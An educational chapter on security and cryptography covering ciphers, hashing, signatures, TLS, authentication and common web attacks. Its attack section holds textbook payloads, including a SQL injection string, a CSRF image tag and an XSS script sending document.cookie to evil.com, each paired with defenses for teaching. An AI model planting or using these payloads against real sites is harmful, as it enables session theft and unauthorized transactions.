# Security & Cryptography — Trust in a Hostile World

> The internet was designed for openness, not safety. Every packet you send
> can be read, copied, modified, or forged by anyone sitting between you
> and your destination. Security is the art of building trust on top of a
> system that offers none.

**Prerequisites:** [Networking](../04-infrastructure/networking.md) — You need HTTP, TLS, and how data moves across networks.
**What it enables:** E-commerce, banking, private communication, digital identity — everything that requires trust.

---

## Why Security Exists

Here is the uncomfortable reality: the internet is a public hallway where everyone is shouting. When you send your credit card number to Amazon, that data passes through a dozen routers, any of which could be compromised. When you log into your bank, how does the bank know it is really you? When you download a software update, how do you know nobody tampered with it?

Security exists because communication happens over channels we do not control. Every security mechanism answers at least one of three fundamental questions:

1. **Confidentiality** — Who can read this? (Only the intended recipient should.)
2. **Integrity** — Has this been tampered with? (The message should arrive exactly as sent.)
3. **Authentication** — Who sent this? (You should be able to verify the sender's identity.)

This is the **CIA triad**, the foundation of all security thinking. Every attack targets at least one of these properties, and every defense protects at least one.

There is a useful fourth property that comes up often: **non-repudiation** — the sender cannot deny having sent the message. This matters in contracts, financial transactions, and legal disputes.

---

## 1. Symmetric Encryption

The oldest idea in cryptography: take a message, apply a secret transformation using a key, and produce gibberish that only someone with the same key can reverse.

```
plaintext + key → ciphertext
ciphertext + key → plaintext
```

Both sides use the **same key**. That is why it is called symmetric.

### AES: The Gold Standard

**AES (Advanced Encryption Standard)** is the symmetric cipher used almost everywhere today. Your HTTPS connections, your encrypted hard drive, your messaging apps — all AES under the hood.

Key facts about AES:
- **Key sizes:** 128, 192, or 256 bits (AES-128 and AES-256 are most common)
- **Block cipher:** Encrypts data in fixed 128-bit (16-byte) blocks
- **Design:** A substitution-permutation network — each round substitutes bytes (confusion), shifts rows and mixes columns (diffusion), then XORs with a round key. AES-128 does this 10 rounds, AES-256 does 14.

The brilliance of AES is that each round is simple, but stacking them makes the relationship between key and ciphertext incomprehensibly complex. No one has found a practical attack against AES since its adoption in 2001.

### Block Cipher Modes: How You Use AES Matters

AES encrypts one 16-byte block at a time. But real messages are longer than 16 bytes. How you chain those blocks together is called the **mode of operation**, and getting this wrong is catastrophic.

**ECB (Electronic Codebook) — Never use this.** Each block is encrypted independently. Identical plaintext blocks produce identical ciphertext blocks. The famous "ECB penguin" demonstrates this: encrypt a bitmap image in ECB mode and you can still see the penguin's outline in the ciphertext. The pattern leaks through.

**CBC (Cipher Block Chaining) — Decent.** Each plaintext block is XORed with the previous ciphertext block before encryption. Identical blocks produce different ciphertext. Requires an initialization vector (IV).

**GCM (Galois/Counter Mode) — The modern choice.** Turns AES into a stream cipher (encrypts a counter and XORs with plaintext). Also provides built-in authentication — it can detect if the ciphertext has been tampered with. Fast, parallelizable, and authenticated. This is what TLS 1.3 uses.

### The Key Distribution Problem

Symmetric encryption has an awkward chicken-and-egg problem: to communicate securely, both parties need the same key. But to share the key securely, they need... an already-secure channel.

If you and your friend could meet in person and exchange a USB drive with a key, great. But on the internet, you are talking to strangers. How do you agree on a secret key with someone you have never met, over a channel that everyone can hear?

This is the problem that asymmetric cryptography solves.

---

## 2. Asymmetric Encryption (Public Key Cryptography)

The breakthrough idea, published in the 1970s: instead of one shared key, use **two mathematically linked keys**.

- The **public key** can encrypt messages and verify signatures
- The **private key** can decrypt messages and create signatures

Anyone can have your public key. Only you have your private key. If someone encrypts a message with your public key, only your private key can decrypt it.

```
Alice's public key  + message → ciphertext    (anyone can do this)
Alice's private key + ciphertext → message     (only Alice can do this)
```

This is like a mailbox with a slot: anyone can drop a letter in (public key), but only the owner with the key can open it (private key).

### RSA

**RSA** (Rivest-Shamir-Adleman, 1977) is the most widely known public-key algorithm. Its security rests on a simple mathematical asymmetry:

- **Easy:** Multiply two large primes: `p × q = n`
- **Hard:** Given `n`, find `p` and `q` (factoring)

Generating an RSA key pair:
1. Pick two large random primes `p` and `q` (each ~1024 bits)
2. Compute `n = p × q` (this is part of your public key)
3. From `p` and `q`, derive a public exponent `e` and private exponent `d`
4. Public key: `(n, e)` — Private key: `(n, d)`

Encryption: `ciphertext = message^e mod n`
Decryption: `message = ciphertext^d mod n`

The math works because of Euler's theorem. The security works because factoring a 2048-bit number would take billions of years with current computers.

RSA is slow — much slower than AES. In practice, RSA is used to encrypt a small symmetric key, and then AES does the heavy lifting. This is called **hybrid encryption**, and it is how almost all real-world encryption works.

### Elliptic Curve Cryptography (ECC)

ECC provides the same security guarantees as RSA but with **much smaller keys**. A 256-bit ECC key offers roughly the same security as a 3072-bit RSA key.

Instead of factoring, ECC relies on the **elliptic curve discrete logarithm problem**: given a point `P` on a curve and `Q = k × P` (where `×` means repeated point addition on the curve), finding `k` is computationally infeasible.

Smaller keys mean faster operations, less bandwidth, and less storage. This is why modern TLS, Signal, and cryptocurrency wallets prefer ECC.

### Diffie-Hellman Key Exchange

Here is the magic trick: two strangers can agree on a shared secret over a completely public channel without ever transmitting the secret.

The intuition (the paint mixing analogy):
1. Alice and Bob publicly agree on a common color (say, yellow)
2. Alice picks a secret color (red). Bob picks a secret color (blue).
3. Alice mixes yellow + red = orange, sends orange publicly
4. Bob mixes yellow + blue = green, sends green publicly
5. Alice takes Bob's green, mixes with her secret red → brown
6. Bob takes Alice's orange, mixes with his secret blue → brown

Both arrive at the same brown. An eavesdropper saw yellow, orange, and green — but unmixing colors is hard. They cannot derive the secret colors or the final brown.

The real math uses modular exponentiation (classic DH) or elliptic curve point multiplication (ECDH). The result is the same: a shared secret that an eavesdropper cannot compute.

**This is how TLS works.** Your browser and a server perform a Diffie-Hellman exchange to agree on a symmetric key, then use AES for the actual data. You get the best of both worlds: the key-exchange flexibility of asymmetric crypto and the speed of symmetric crypto.

---

## 3. Hashing

A **hash function** takes an input of any size and produces a fixed-size output (the **digest** or **fingerprint**). Unlike encryption, hashing is a one-way function — you cannot recover the input from the output.

```
SHA-256("hello") → 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
SHA-256("Hello") → 185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969
SHA-256("hello" + one bit changed) → completely different hash
```

### Properties of a Good Hash Function

1. **Deterministic:** Same input always produces the same output
2. **Fast to compute:** Generating the hash is efficient
3. **Avalanche effect:** A tiny change in input produces a dramatically different output
4. **Pre-image resistant:** Given a hash, you cannot find the input that produced it
5. **Collision resistant:** It is infeasible to find two different inputs that produce the same hash

### Common Hash Functions

- **SHA-256:** The workhorse. Used in TLS, Git, Bitcoin, digital signatures. 256-bit output.
- **SHA-3:** A different design (sponge construction) for diversity. Not a replacement for SHA-2, more of a backup.
- **MD5/SHA-1:** Broken. Collisions have been found. Do not use for security.

### Hashing Passwords

Never store passwords in plaintext. If your database is breached (and eventually, it will be), every user's password is exposed.

Instead: store `hash(password)`. When a user logs in, hash what they typed and compare it to the stored hash. You never need to know the actual password.

But naive hashing has problems:

**Rainbow tables:** Attackers precompute hashes for millions of common passwords. If your hash of "password123" matches their precomputed hash, they know your password instantly.

**Salt:** A random string added to each password before hashing: `hash(salt + password)`. Each user gets a different salt (stored alongside the hash). Now rainbow tables are useless — the attacker would need a separate table for every possible salt.

**bcrypt, scrypt, Argon2:** These are purpose-built password hashing functions that are **intentionally slow**. SHA-256 can compute billions of hashes per second, which is great for file integrity but terrible for password security — an attacker can brute-force quickly. bcrypt forces each hash to take ~100ms, making brute-force attacks millions of times slower.

```
// What your database should store:
$2b$12$LJ3m4ys3Lz0rKxUx5.hXxu8vYN7hFqZDVoSmWEyGpoYT3K9yM.e6K
 ↑    ↑            ↑                           ↑
 bcrypt cost=12   salt (22 chars)              hash (31 chars)
```

---

## 4. Digital Signatures

Digital signatures solve a problem encryption alone cannot: **proving who sent a message and that it has not been altered.**

The process:
1. Alice hashes her message (producing a small, fixed-size digest)
2. Alice encrypts the hash with her **private key** — this is the signature
3. Alice sends the message + signature
4. Bob hashes the received message himself
5. Bob decrypts the signature with Alice's **public key**, recovering the original hash
6. If the hashes match: the message is authentic and unmodified

```
Signing:   hash(message) → digest → encrypt(digest, private_key) → signature
Verifying: decrypt(signature, public_key) → digest₁
           hash(message) → digest₂
           digest₁ == digest₂ ? Valid : Forged
```

Why hash first instead of signing the entire message? Because asymmetric encryption is slow. Hashing reduces any message to a small fixed-size digest, and you only need to sign that.

Digital signatures provide:
- **Authentication:** Only the holder of the private key could have produced the signature
- **Integrity:** Any change to the message changes the hash, invalidating the signature
- **Non-repudiation:** Alice cannot deny signing — her public key proves she did

Digital signatures are everywhere: software updates (is this really from Apple?), Git commits (is this really from this developer?), legal documents, cryptocurrency transactions, TLS certificates.

---

## 5. Certificates and PKI

Asymmetric cryptography has its own trust problem. If someone hands you a public key and says "I am your bank," how do you verify that?

A **man-in-the-middle** could intercept your connection, hand you their own public key, and relay everything between you and the real bank — reading everything.

### Certificate Authorities (CAs)

The solution is a **chain of trust**. A **Certificate Authority** is a trusted third party that verifies identities and signs certificates.

A **certificate** (X.509 format) contains:
- The domain name (e.g., `amazon.com`)
- The owner's public key
- The CA's digital signature
- Validity period
- Other metadata

When your browser connects to `amazon.com`, the server sends its certificate. Your browser checks: "Is this certificate signed by a CA I trust?" Your operating system and browser ship with a list of ~100 trusted **root CAs** pre-installed.

### The Chain of Trust

In practice, root CAs do not sign website certificates directly. The chain looks like this:

```
Root CA (pre-installed in your browser/OS)
  └── signs → Intermediate CA certificate
                └── signs → Website certificate (amazon.com)
```

Your browser walks the chain:
1. The website certificate is signed by an intermediate CA
2. The intermediate CA certificate is signed by a root CA
3. The root CA is in the browser's trusted store

If every link checks out, the certificate is valid. If any link is broken, you get the scary "Your connection is not private" warning.

### Let's Encrypt

Before 2015, certificates cost money and required manual verification. **Let's Encrypt** changed everything by providing free, automated certificates. You prove you control a domain through an automated challenge, and you get a certificate in seconds. This drove HTTPS adoption from ~40% to >90% of web traffic.

---

## 6. The TLS Handshake

TLS (Transport Layer Security) is the protocol that puts the S in HTTPS. Every secure connection you make — every website, every API call, every email — uses TLS. Here is what happens when your browser connects to a server, step by step.

### TLS 1.3 Handshake (the modern version)

```
Browser (Client)                          Server
    │                                       │
    │──── Client Hello ────────────────────>│
    │     • Supported cipher suites          │
    │     • Client random                    │
    │     • Key share (DH public value)      │
    │                                       │
    │<─── Server Hello ────────────────────│
    │     • Chosen cipher suite              │
    │     • Server random                    │
    │     • Key share (DH public value)      │
    │     • Certificate                      │
    │     • Certificate Verify (signature)   │
    │     • Finished                         │
    │                                       │
    │──── Finished ────────────────────────>│
    │                                       │
    │<════ Encrypted Application Data ═════>│
```

Step by step:

1. **Client Hello:** Your browser says "I want to talk securely. Here are the cipher suites I support, and here is my half of a Diffie-Hellman key exchange."

2. **Server Hello + Certificate:** The server picks a cipher suite, provides its half of the DH exchange, and sends its certificate (so the browser can verify the server's identity). The server also sends a signature over the handshake transcript using its private key.

3. **Key Derivation:** Both sides now have the DH shared secret. They derive symmetric encryption keys from it. From this point, everything is encrypted with AES.

4. **Finished:** Both sides send a "Finished" message encrypted with the new keys, confirming the handshake succeeded.

Total: **one round trip** (1-RTT). The first encrypted data can flow almost immediately.

### What TLS 1.3 Improved Over 1.2

- **Fewer round trips:** TLS 1.2 required two round trips; 1.3 needs one. (TLS 1.3 even supports 0-RTT resumption for repeat connections.)
- **Removed insecure options:** TLS 1.3 eliminated RSA key exchange (no forward secrecy), CBC mode, RC4, 3DES, and other legacy ciphers. Fewer choices means fewer ways to misconfigure.
- **Forward secrecy by default:** Every connection uses ephemeral DH keys. If the server's private key is compromised later, past recordings of traffic cannot be decrypted.

---

## 7. Authentication

Authentication is proving you are who you claim to be. It sounds simple. It is one of the hardest problems in security.

### Passwords: Something You Know

The oldest and weakest form of authentication. Problems are well-documented:
- **Weak passwords:** "password123" appears in every breach database
- **Password reuse:** Users use the same password everywhere, so one breach compromises many accounts
- **Phishing:** Fake login pages trick users into handing over credentials
- **Credential stuffing:** Attackers try leaked username/password pairs from one site against another

Passwords alone are not enough for anything important.

### Multi-Factor Authentication (MFA)

Combine two or more factors from different categories:
- **Something you know:** Password, PIN
- **Something you have:** Phone, hardware key, authenticator app
- **Something you are:** Fingerprint, face, iris

An attacker who steals your password still cannot log in without your phone. An attacker who steals your phone still cannot log in without your password. The combination is dramatically stronger than either factor alone.

**TOTP (Time-based One-Time Passwords):** Your authenticator app and the server share a secret. Both compute `HMAC(secret, current_time / 30s)` and get the same 6-digit code. The code changes every 30 seconds.

**Hardware keys (FIDO2/U2F):** Physical devices like YubiKeys that perform challenge-response authentication. Phishing-resistant because the key verifies the website's identity before responding.

### OAuth 2.0 and OpenID Connect

"Login with Google" is not Google sharing your password with the third-party app. It is **delegated authentication** using OAuth 2.0:

1. The app redirects you to Google's login page
2. You authenticate directly with Google
3. Google gives the app a **token** (not your password) with limited permissions
4. The app uses the token to access only what you approved

**OpenID Connect** layers identity on top of OAuth 2.0. The app gets a **JWT (JSON Web Token)** containing your name, email, and other claims — signed by Google so it cannot be forged.

### Session Tokens and JWTs

After you log in, the server needs to remember you are authenticated for subsequent requests. Two approaches:

**Session tokens:** The server stores session data (user ID, expiry, permissions) and gives you a random token (stored in a cookie). Each request sends the cookie; the server looks up the session. Stateful but simple.

**JWTs (JSON Web Tokens):** The server gives you a signed JSON blob containing your identity and permissions. Each request sends the JWT; the server verifies the signature without looking anything up. Stateless — great for distributed systems, but harder to revoke.

```
// A JWT has three parts: header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJS...

// Decoded payload:
{
  "user": "alice",
  "role": "admin",
  "exp": 1700000000
}
```

### Passkeys and WebAuthn: The Passwordless Future

Passkeys replace passwords entirely with public-key cryptography:
1. Your device generates a key pair for each site
2. The public key is stored by the site; the private key stays on your device
3. To log in, the site sends a challenge; your device signs it with the private key
4. Your device unlocks the private key with biometrics (fingerprint, face)

No password to steal, phish, or reuse. The private key never leaves your device. This is the direction the industry is moving.

---

## 8. Authorization

Authentication answers "Who are you?" Authorization answers "What are you allowed to do?"

These are different. You can authenticate perfectly (confirm someone is Alice) and still need to determine whether Alice is allowed to delete the production database.

### Models of Authorization

**RBAC (Role-Based Access Control):** Assign users to roles, assign permissions to roles. User → Role → Permissions. Simple and widely used.

```
Role: viewer  → can read articles
Role: editor  → can read + write articles
Role: admin   → can read + write + delete articles + manage users

Alice → editor
Bob   → viewer
```

**ABAC (Attribute-Based Access Control):** Decisions based on attributes of the user, resource, and environment. More flexible, more complex. "Users in the engineering department can access code repositories during business hours from corporate IPs."

**ACLs (Access Control Lists):** Each resource has a list of who can do what. Your filesystem uses this: `rwxr-xr--` means owner can read/write/execute, group can read/execute, others can only read.

### The Principle of Least Privilege

Every user, program, and system should have only the minimum permissions needed to do its job. A web server that only serves static files should not have database access. A junior developer should not have production deployment keys.

This limits the blast radius when something goes wrong — and something always goes wrong.

### The Confused Deputy Problem

A **confused deputy** is a program with more privileges than the user, which can be tricked into misusing those privileges on the user's behalf.

Example: A compiler service has write access to the system directory (to store output files). A user asks it to write output to `/etc/passwd`. The compiler has permission, so it complies — even though the user does not have that permission.

The defense: capabilities and context-aware authorization. The system should check not just whether the program can do something, but whether the request's origin has the right to ask for it.

---

## 9. Common Attacks

Security is best understood through the attacks it defends against. Here are the ones that matter most.

### SQL Injection

**What it is:** User input is inserted directly into a database query, allowing the attacker to execute arbitrary SQL.

```python
# Vulnerable code
query = "SELECT * FROM users WHERE name = '" + user_input + "'"

# If user_input is:  ' OR '1'='1
# Query becomes:
# SELECT * FROM users WHERE name = '' OR '1'='1'
# This returns ALL users
```

**Defense:** Parameterized queries (prepared statements). Never concatenate user input into SQL.

```python
# Safe code
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))
```

### XSS (Cross-Site Scripting)

**What it is:** An attacker injects malicious JavaScript into a web page that other users view. The script runs in the victim's browser with the victim's cookies and session.

```html
<!-- Attacker posts a comment containing: -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

<!-- Every user who views the comment sends their cookies to the attacker -->
```

**Defense:** Escape all user-generated content before rendering it in HTML. Use Content Security Policy (CSP) headers to restrict what scripts can run. Modern frameworks (React, Vue) escape output by default.

### CSRF (Cross-Site Request Forgery)

**What it is:** An attacker tricks a logged-in user into making an unintended request. If you are logged into your bank and visit a malicious page, that page can submit a form to your bank — and your browser helpfully includes your authentication cookies.

```html
<!-- On evil.com: -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
<!-- Your browser sends this request WITH your bank cookies -->
```

**Defense:** CSRF tokens — a random value included in every form that the server verifies. The attacker's page cannot read or guess this token. SameSite cookie attributes also help.

### Buffer Overflow

**What it is:** Writing more data into a buffer than it can hold, overwriting adjacent memory. In languages like C without bounds checking, this can overwrite the function's return address, redirecting execution to attacker-controlled code.

```c
char buffer[8];
strcpy(buffer, "AAAAAAAAAAAAAAAA\x90\x90\x90...<shellcode>");
// Overwrites return address → executes attacker's code
```

**Defense:** Bounds checking, stack canaries (detect overwrites before returning), ASLR (randomize memory layout so the attacker cannot predict addresses), DEP/NX (mark memory as non-executable). Or better: use memory-safe languages (Rust, Go, Java, Python).

### Man-in-the-Middle (MITM)

**What it is:** An attacker positions themselves between two communicating parties, intercepting and potentially modifying messages. On an unsecured Wi-Fi network, an attacker can intercept all traffic between your device and the router.

**Defense:** TLS (encrypted, authenticated connections). Certificate pinning for high-security applications. HSTS (HTTP Strict Transport Security) to prevent downgrade attacks.

### Phishing

**What it is:** Social engineering — tricking a human into revealing credentials or installing malware. A convincing email from "your bank" with a link to a fake login page.

**Defense:** User education (check URLs carefully), email authentication (SPF, DKIM, DMARC), hardware security keys (which verify the server's domain), and passkeys (which are bound to specific domains and cannot be phished).

### Supply Chain Attacks

**What it is:** Compromising a dependency rather than the target directly. If a popular npm package is compromised, every application that installs it is affected. The SolarWinds attack (2020) compromised a widely-used IT monitoring tool, affecting thousands of organizations including government agencies.

**Defense:** Pin dependency versions, use lock files, audit dependencies, use tools like `npm audit` or `cargo audit`, sign releases, and verify checksums. Minimal dependencies reduce attack surface.

---

## 10. Defense in Depth

No single security measure is sufficient. Security works in layers, like a medieval castle: a moat, then walls, then towers, then guards, then locks on doors. An attacker must breach every layer.

```
┌─────────────────────────────────────────────┐
│            Network Security                 │
│  ┌─────────────────────────────────────┐    │
│  │       Firewalls / WAF               │    │
│  │  ┌─────────────────────────────┐    │    │
│  │  │     Authentication          │    │    │
│  │  │  ┌─────────────────────┐    │    │    │
│  │  │  │   Authorization     │    │    │    │
│  │  │  │  ┌─────────────┐    │    │    │    │
│  │  │  │  │ Input Valid. │    │    │    │    │
│  │  │  │  │  ┌───────┐  │    │    │    │    │
│  │  │  │  │  │ Data  │  │    │    │    │    │
│  │  │  │  │  └───────┘  │    │    │    │    │
│  │  │  │  └─────────────┘    │    │    │    │
│  │  │  └─────────────────────┘    │    │    │
│  │  └─────────────────────────────┘    │    │
│  └─────────────────────────────────────┘    │
└─────────────────────────────────────────────┘
```

The layers:
- **Input validation:** Sanitize and validate everything from the outside world
- **Encryption:** Protect data in transit (TLS) and at rest (disk encryption)
- **Authentication:** Verify identity at every entry point
- **Authorization:** Enforce least privilege everywhere
- **Monitoring and logging:** Detect breaches quickly (the average time to detect a breach is over 200 days)
- **Patching:** Keep systems updated — most breaches exploit known vulnerabilities
- **Incident response:** Have a plan for when (not if) something goes wrong

### Zero-Trust Architecture

Traditional security used a "castle and moat" model: everything inside the corporate network is trusted, everything outside is not. VPNs extended the moat to remote workers.

The problem: once an attacker gets inside (phishing, compromised laptop, malicious insider), they have free rein.

**Zero trust** flips this: **never trust, always verify** — even inside the network. Every request is authenticated, authorized, and encrypted, regardless of where it comes from. There is no "trusted zone."

Principles:
- Verify every user and device on every request
- Use least-privilege access
- Assume breach — segment networks, limit blast radius
- Encrypt everything, everywhere

Google pioneered this with **BeyondCorp** after being breached in 2009. Instead of a VPN, every Google service verifies the user and device independently. The corporate network is treated as no more trustworthy than a coffee shop Wi-Fi.

---

## Key Mental Models

- **The CIA triad is your checklist.** For any system, ask: How is confidentiality protected? Integrity? Authentication? If you cannot answer one, you have found a vulnerability.

- **Cryptography is plumbing, not magic.** The algorithms are solid. Breaches almost always come from implementation mistakes, misconfiguration, or human error — not from broken math.

- **Think like an attacker.** The defender must protect every entry point; the attacker only needs to find one. Always ask: "What is the weakest link in this chain?"

- **Security is economics, not perfection.** You cannot make a system impenetrable, but you can make it more expensive to break than it is worth. A bike lock does not make your bike unstealable — it makes stealing it harder than stealing the unlocked bike next to it.

---

## How This Connects

**From below (Layer 4 — Networking):**
- TLS runs on top of TCP. The handshake happens after the TCP connection is established.
- DNS is a frequent attack vector (DNS spoofing). DNSSEC adds signatures to DNS records.
- Network architecture (firewalls, subnets) provides the first layer of defense.

**To above (Layer 6 — Software Engineering):**
- Secure coding practices (input validation, parameterized queries) prevent most application-level attacks
- Authentication and authorization are core concerns of every web application
- Dependency management and supply chain security are part of the software lifecycle
- Security is not a feature you bolt on at the end — it is a property of the entire system

---

## Hands-On

1. **Explore a certificate chain:** Run `openssl s_client -connect google.com:443 -showcerts` in your terminal. Read the output — you will see the server certificate, the intermediate CA, and can trace the chain to a root CA. Run `openssl x509 -in cert.pem -text -noout` to decode a certificate's contents.

2. **Hash something:** Run `echo -n "hello" | openssl dgst -sha256`. Change one character and see the avalanche effect. Try `echo -n "Hello" | openssl dgst -sha256` — completely different output.

3. **Generate a key pair:** Run `openssl genrsa -out private.pem 2048` then `openssl rsa -in private.pem -pubout -out public.pem`. You now have an RSA key pair. Encrypt a small file with the public key and decrypt with the private key.

4. **Inspect a TLS handshake:** Run `openssl s_client -connect example.com:443 -tls1_3 -msg` to see the TLS 1.3 handshake messages in real time.

5. **Try a CTF (Capture The Flag):** Start with [OverTheWire Bandit](https://overthewire.org/wargames/bandit/) for Linux basics, then try [picoCTF](https://picoctf.org/) for beginner-friendly security challenges. CTFs teach you to think like an attacker.

---

## Go Deeper

- **"Cryptography Engineering"** by Ferguson, Schneier, and Kohno — Practical cryptography for engineers. How to use crypto correctly.
- **"The Web Application Hacker's Handbook"** — Comprehensive guide to web security testing and common vulnerabilities.
- **"Serious Cryptography"** by Jean-Philippe Aumasson — Modern, accessible, and rigorous introduction to cryptographic primitives.
- **Computerphile (YouTube)** — Excellent short videos on crypto concepts: "AES Explained," "Public Key Cryptography," "Hashing Algorithms."
- **OWASP Top 10** — The Open Web Application Security Project's list of the ten most critical web application security risks. Updated regularly.
- **CryptoPals Challenges** (cryptopals.com) — Learn crypto by breaking it. Implement attacks against real cryptographic constructions.

---

*Next: [Software Engineering](../06-engineering/software-engineering.md) — How do humans build and maintain large systems?*
